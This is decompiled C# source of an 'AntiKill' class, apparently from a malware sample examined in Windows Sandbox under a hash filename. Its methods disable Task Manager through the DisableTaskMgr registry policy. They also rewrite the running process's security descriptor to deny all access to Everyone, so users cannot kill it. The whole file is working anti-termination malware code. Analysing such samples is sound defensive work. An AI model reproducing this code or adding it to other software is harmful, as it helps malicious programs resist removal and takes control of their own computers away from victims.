// Decompiled with JetBrains decompiler
// Type: Complex.AntiKill
// Assembly: Client-2, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 10231E92-BCE6-4007-A463-67D77912E754
// Assembly location: C:\Users\WDAGUtilityAccount\Desktop\5d40615701c48a122e44f831e7c8643d07765629a83b15d090587f469c77693d

using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;

namespace Complex
{
  internal class AntiKill
  {
    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool GetKernelObjectSecurity(
      IntPtr Handle,
      int securityInformation,
      [Out] byte[] pSecurityDescriptor,
      uint nLength,
      out uint lpnLengthNeeded);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool SetKernelObjectSecurity(
      IntPtr Handle,
      int securityInformation,
      [In] byte[] pSecurityDescriptor);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();

    public void DisTaskManager(bool enable)
    {
      try
      {
        RegistryKey subKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
        if (enable && subKey.GetValue("DisableTaskMgr") != null)
          subKey.DeleteValue("DisableTaskMgr");
        else
          subKey.SetValue("DisableTaskMgr", (object) "1");
        subKey.Close();
      }
      catch
      {
      }
    }

    private RawSecurityDescriptor GetProcessSecurityDescriptor(
      IntPtr processHandle)
    {
      byte[] pSecurityDescriptor = new byte[0];
      uint lpnLengthNeeded;
      AntiKill.GetKernelObjectSecurity(processHandle, 4, pSecurityDescriptor, 0U, out lpnLengthNeeded);
      if (lpnLengthNeeded < 0U || lpnLengthNeeded > (uint) short.MaxValue)
        throw new Win32Exception();
      byte[] binaryForm;
      if (!AntiKill.GetKernelObjectSecurity(processHandle, 4, binaryForm = new byte[(IntPtr) lpnLengthNeeded], lpnLengthNeeded, out lpnLengthNeeded))
        throw new Win32Exception();
      return new RawSecurityDescriptor(binaryForm, 0);
    }

    private void SetProcessSecurityDescriptor(IntPtr processHandle, RawSecurityDescriptor dacl)
    {
      byte[] numArray = new byte[dacl.BinaryLength];
      dacl.GetBinaryForm(numArray, 0);
      if (!AntiKill.SetKernelObjectSecurity(processHandle, 4, numArray))
        throw new Win32Exception();
    }

    public void IamInmortal()
    {
      IntPtr currentProcess = AntiKill.GetCurrentProcess();
      RawSecurityDescriptor securityDescriptor = this.GetProcessSecurityDescriptor(currentProcess);
      securityDescriptor.DiscretionaryAcl.InsertAce(0, (GenericAce) new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, (SecurityIdentifier) null), false, (byte[]) null));
      this.SetProcessSecurityDescriptor(currentProcess, securityDescriptor);
    }
  }
}
